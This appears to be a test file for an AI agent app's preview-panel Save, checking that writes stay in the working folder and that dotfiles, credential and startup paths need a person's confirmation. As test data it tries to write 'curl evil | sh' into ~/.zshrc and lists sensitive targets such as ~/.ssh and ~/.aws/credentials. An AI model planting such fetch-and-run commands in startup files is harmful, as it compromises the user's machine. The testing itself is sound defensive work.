// ATO-2533: Save from the preview panel writes only inside the chat's working
// folder or to the very file the panel opened (main/preview-save-scope.ts),
// and only for the main window's page (main.ts). Outside the folder, and for
// hidden, startup and state files anywhere, a person must say yes in main's
// dialog (main/preview-save-sensitive.ts). Throwaway folders only.
import { after, test } from "node:test";
import assert from "node:assert/strict";
import { linkSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const { filePreviewSave } = require("../out/main/file-save.js");
const { PreviewOpenedFiles, previewSaveScope, PREVIEW_OPENED_MAX } = require("../out/main/preview-save-scope.js");
const { isSensitiveSavePath, previewSaveConfirmDialog } = require("../out/main/preview-save-sensitive.js");

const home = realpathSync(mkdtempSync(join(tmpdir(), "pss-home-")));
after(() => rmSync(home, { recursive: true, force: true }));
const P = process.platform;
const work = join(home, "project");
const other = join(home, "Documents");
const state = join(home, ".atomic-agent");
for (const d of [work, other, state]) mkdirSync(d, { recursive: true });
const stamp = (f) => { const s = statSync(f); return { size: s.size, mtimeMs: s.mtimeMs }; };

/** main's dialog, played by the test: answers `yes` and records what it was asked. */
function person(yes) {
  const asked = [];
  return { asked, confirm: async (real, sensitive) => { asked.push({ real, sensitive }); return yes; } };
}

/** Save as main.ts does it now: the scope's roots and its final say. */
async function save(file, text, workingDir, opened, who = person(false)) {
  const scope = previewSaveScope(workingDir, opened, P, { home, stateDirs: [state], confirm: who.confirm });
  return filePreviewSave(file, text, stamp(file), scope.roots, home, P, { allows: scope.allows });
}

test("Save writes inside the chat's working folder without asking", async () => {
  const f = join(work, "notes.md");
  writeFileSync(f, "old\n");
  const who = person(false);
  const r = await save(f, "new\n", work, new PreviewOpenedFiles(), who);
  assert.equal(r.ok, true);
  assert.equal(readFileSync(f, "utf8"), "new\n");
  assert.equal(who.asked.length, 0);
});

test("Save is refused for another file under home, even one the preview could read", async () => {
  const f = join(other, "taxes.txt");
  writeFileSync(f, "keep");
  assert.deepEqual(await save(f, "x", work, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  const rc = join(home, ".zshrc");
  writeFileSync(rc, "keep");
  assert.deepEqual(await save(rc, "curl evil | sh", work, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(rc, "utf8"), "keep");
  // `..` out of the working folder is the same file outside it.
  assert.deepEqual(await save(join(work, "..", ".zshrc"), "x", work, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(f, "utf8"), "keep");
});

test("F2096.1: with the home folder as the chat folder (a fresh install), Save does not write dotfiles", async () => {
  const rc = join(home, ".zshrc");
  writeFileSync(rc, "keep");
  mkdirSync(join(home, ".ssh"), { recursive: true });
  const keys = join(home, ".ssh", "authorized_keys");
  writeFileSync(keys, "keep");
  const doc = join(other, "home-folder.txt");
  writeFileSync(doc, "keep");
  for (const f of [rc, keys, doc]) {
    assert.deepEqual(await save(f, "x", home, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" }, f);
    assert.equal(readFileSync(f, "utf8"), "keep");
  }
  // A folder above home is no folder either.
  assert.deepEqual(await save(rc, "x", join(home, ".."), new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  // The panel opened it, but nobody said yes: still refused, and the person was asked about a settings file.
  const opened = new PreviewOpenedFiles();
  await opened.remember(rc, home);
  const no = person(false);
  assert.deepEqual(await save(rc, "curl evil | sh", home, opened, no), { ok: false, reason: "outside" });
  assert.deepEqual(no.asked, [{ real: rc, sensitive: true }]);
  assert.equal(readFileSync(rc, "utf8"), "keep");
});

test("F2096.2: a file the panel opened needs a person's yes in main, once", async () => {
  const f = join(other, "opened.txt");
  writeFileSync(f, "old");
  const opened = new PreviewOpenedFiles();
  await opened.remember(f, work);
  assert.deepEqual(await save(f, "x", work, opened, person(false)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(f, "utf8"), "old");
  const yes = person(true);
  assert.equal((await save(f, "new", work, opened, yes)).ok, true);
  assert.equal(readFileSync(f, "utf8"), "new");
  assert.deepEqual(yes.asked, [{ real: f, sensitive: false }]);
  // The yes is kept for that very file: the next Save does not ask again.
  const again = person(false);
  assert.equal((await save(f, "newer", work, opened, again)).ok, true);
  assert.equal(again.asked.length, 0);
  // Its neighbour was not opened: refused without asking.
  const n = join(other, "neighbour.txt");
  writeFileSync(n, "keep");
  const ask = person(true);
  assert.deepEqual(await save(n, "x", work, opened, ask), { ok: false, reason: "outside" });
  assert.equal(ask.asked.length, 0);
});

test("hidden and state files ask even inside the chat folder; a worktree's own files do not", async () => {
  const env = join(work, ".env");
  writeFileSync(env, "KEY=1");
  mkdirSync(join(work, ".git", "hooks"), { recursive: true });
  const hook = join(work, ".git", "hooks", "pre-commit");
  writeFileSync(hook, "#!/bin/sh\n");
  for (const f of [env, hook]) {
    const opened = new PreviewOpenedFiles();
    assert.deepEqual(await save(f, "x", work, opened, person(true)), { ok: false, reason: "outside" }, f);
    await opened.remember(f, work);
    const no = person(false);
    assert.deepEqual(await save(f, "x", work, opened, no), { ok: false, reason: "outside" }, f);
    assert.deepEqual(no.asked, [{ real: f, sensitive: true }]);
  }
  const config = join(state, "config.json");
  writeFileSync(config, "{}");
  assert.deepEqual(await save(config, "{\"x\":1}", state, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(config, "utf8"), "{}");
  const tree = join(state, "worktrees", "repo-1", "chat");
  mkdirSync(tree, { recursive: true });
  const src = join(tree, "main.js");
  writeFileSync(src, "old");
  const who = person(false);
  assert.equal((await save(src, "new", tree, new PreviewOpenedFiles(), who)).ok, true);
  assert.equal(who.asked.length, 0);
});

test("F2096.3: a hard link in the working folder is refused", async () => {
  const target = join(other, "hard-target.txt");
  writeFileSync(target, "keep");
  const n = join(work, "n.txt");
  linkSync(target, n);
  assert.deepEqual(await save(n, "x", work, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(target, "utf8"), "keep");
});

test("a link in the working folder that leads out of it is outside it", async () => {
  const target = join(other, "linked.txt");
  writeFileSync(target, "keep");
  symlinkSync(target, join(work, "link.txt"));
  assert.deepEqual(await save(join(work, "link.txt"), "x", work, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(target, "utf8"), "keep");
});

test("an opened file counts only under the folder it was opened in, and only while it is the same file", async () => {
  const f = join(other, "swapped.txt");
  writeFileSync(f, "old");
  const opened = new PreviewOpenedFiles();
  await opened.remember(f, work);
  // Another chat folder: not this chat's file.
  assert.deepEqual(await save(f, "x", join(home, "elsewhere"), opened, person(true)), { ok: false, reason: "outside" });
  // Put another file in its place (made first, so it is surely another inode): not the file the panel opened.
  writeFileSync(f + ".tmp", "new file");
  renameSync(f + ".tmp", f);
  assert.deepEqual(await save(f, "x", work, opened, person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(f, "utf8"), "new file");
  // A link put in its place, leading to a file that was never opened.
  const secret = join(other, "secret.txt");
  writeFileSync(secret, "keep");
  const g = join(other, "relinked.txt");
  writeFileSync(g, "old");
  await opened.remember(g, work);
  unlinkSync(g);
  symlinkSync(secret, g);
  assert.deepEqual(await save(g, "x", work, opened, person(true)), { ok: false, reason: "outside" });
  assert.equal(readFileSync(secret, "utf8"), "keep");
});

test("a remote agent has no working folder here: only opened files a person said yes to", async () => {
  const f = join(work, "remote.txt");
  writeFileSync(f, "keep");
  assert.deepEqual(await save(f, "x", null, new PreviewOpenedFiles(), person(true)), { ok: false, reason: "outside" });
});

test("the remembered list is bounded, the oldest first out", async () => {
  const opened = new PreviewOpenedFiles();
  const files = [];
  for (let i = 0; i <= PREVIEW_OPENED_MAX; i++) {
    const f = join(other, `many-${i}.txt`);
    writeFileSync(f, "x");
    files.push(f);
    await opened.remember(f, work);
  }
  const paths = opened.paths(work);
  assert.equal(paths.length, PREVIEW_OPENED_MAX);
  assert.ok(!paths.includes(files[0]));
  assert.ok(paths.includes(files[PREVIEW_OPENED_MAX]));
});

test("isSensitiveSavePath: hidden entries, login-run folders and state, counted from the folder or home", () => {
  const c = (folder) => ({ platform: "darwin", home: "/Users/a", folder, stateDirs: ["/Users/a/.atomic-agent", "/srv/agent-state"] });
  for (const p of ["/Users/a/.zshrc", "/Users/a/.bashrc", "/Users/a/.profile", "/Users/a/.gitconfig", "/Users/a/.ssh/config",
    "/Users/a/.aws/credentials", "/Users/a/.config/fish/config.fish", "/Users/a/Library/LaunchAgents/x.plist",
    "/Users/a/.atomic-agent/config.json", "/srv/agent-state/.env", "/srv/agent-state/models/llama-server.key"]) {
    assert.equal(isSensitiveSavePath(p, c(null)), true, p);
  }
  assert.equal(isSensitiveSavePath("/Users/a/p/.env", c("/Users/a/p")), true);
  assert.equal(isSensitiveSavePath("/Users/a/p/src/a.ts", c("/Users/a/p")), false);
  assert.equal(isSensitiveSavePath("/Users/a/Documents/a.txt", c(null)), false);
  // A chat folder that is one of the agent's worktrees: its files are the project's.
  const tree = "/Users/a/.atomic-agent/worktrees/repo-1/chat";
  assert.equal(isSensitiveSavePath(`${tree}/src/a.ts`, c(tree)), false);
  assert.equal(isSensitiveSavePath(`${tree}/.env`, c(tree)), true);
  assert.equal(isSensitiveSavePath("/Users/a/.atomic-agent/worktrees/desktop-chats.json", c("/Users/a/.atomic-agent/worktrees")), true);
  assert.equal(isSensitiveSavePath("/Users/a/.atomic-agent/config.json", c("/Users/a/.atomic-agent")), true);
  const w = { platform: "win32", home: "C:\\Users\\a", folder: null, stateDirs: [] };
  assert.equal(isSensitiveSavePath("C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.cmd", w), true);
  assert.equal(isSensitiveSavePath("C:\\Users\\a\\.ssh\\config", w), true);
  assert.equal(isSensitiveSavePath("C:\\Users\\a\\Documents\\a.txt", w), false);
});

test("the dialog says which file, defaults to Cancel and names a settings file as one", () => {
  const d = previewSaveConfirmDialog("/Users/a/.zshrc", true, "/Users/a", "darwin");
  assert.deepEqual(d.buttons, ["Save", "Cancel"]);
  assert.equal(d.defaultId, 1);
  assert.equal(d.cancelId, 1);
  assert.match(d.message, /settings file/);
  assert.match(d.detail, /^~\/\.zshrc\n/);
  assert.match(previewSaveConfirmDialog("/tmp/a.txt", false, "/Users/a", "darwin").detail, /^\/tmp\/a\.txt\n/);
});

test("main.ts: Save only from the main window, with the narrowed scope and main's dialog; the read remembers what it served", () => {
  const main = readFileSync(new URL("../main/main.ts", import.meta.url), "utf8");
  const handler = main.slice(main.indexOf('ipcMain.handle("app:filePreviewSave"'), main.indexOf('ipcMain.handle("app:imageSaveAs"'));
  assert.match(handler, /_event\.sender !== win\.webContents\) return \{ ok: false, reason: "outside" \}/);
  assert.match(handler, /previewSaveScope\(previewWorkingDir\(\), previewOpened, process\.platform, previewSaveGuard\)/);
  assert.match(handler, /scope\.roots, homedir\(\), process\.platform, \{ force: force === true, allows: scope\.allows \}/);
  assert.doesNotMatch(handler, /previewRoots\(\)/);
  const read = main.slice(main.indexOf('ipcMain.handle("app:filePreview",'), main.indexOf('ipcMain.handle("app:filePreviewSlides"'));
  assert.match(read, /previewOpened\.remember\(r\.path, previewWorkingDir\(\)\)/);
  const guard = main.slice(main.indexOf("const previewSaveGuard"), main.indexOf('ipcMain.handle("app:filePreview",'));
  assert.match(guard, /stateDirs: \[\.\.\.new Set\(\[DESKTOP_STATE_DIR, TUI_STATE_DIR, LEGACY_DESKTOP_STATE_DIR\]\)\]/);
  assert.match(guard, /dialog\.showMessageBox\(win, previewSaveConfirmDialog\(real, sensitive, homedir\(\), process\.platform\)\)/);
  assert.match(guard, /return response === 0;/);
});
